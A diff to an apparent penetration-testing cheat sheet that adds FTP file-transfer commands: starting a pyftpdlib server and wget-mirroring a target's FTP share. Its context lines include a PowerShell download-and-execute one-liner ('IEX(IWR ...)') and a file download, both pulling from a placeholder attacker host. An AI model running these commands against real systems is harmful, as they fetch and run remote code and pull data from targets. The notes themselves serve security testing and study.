@@ -521,6 +521,11 @@ IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
 ```
 
+##### FTP
+```cmd
+python -m pyftpdlib -p 21 -w	// To start the ftp server on port 21
+```
+
 ##### Bash only
 
 ###### wget version
@@ -592,8 +597,9 @@ __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```shell
 ftp <RHOST>
 ftp -A <RHOST>
+wget -m ftp://anonymous:anonymous@<RHOST>		\\  Mirror mode
 wget -r ftp://anonymous:anonymous@<RHOST>
-python -m pyftpdlib -p 21 -w	// To start the ftp server on port 21
+wget -r --user="USERNAME" --password="PASSWORD" ftp://<RHOST>/
 ```
 
 #### Kerberos
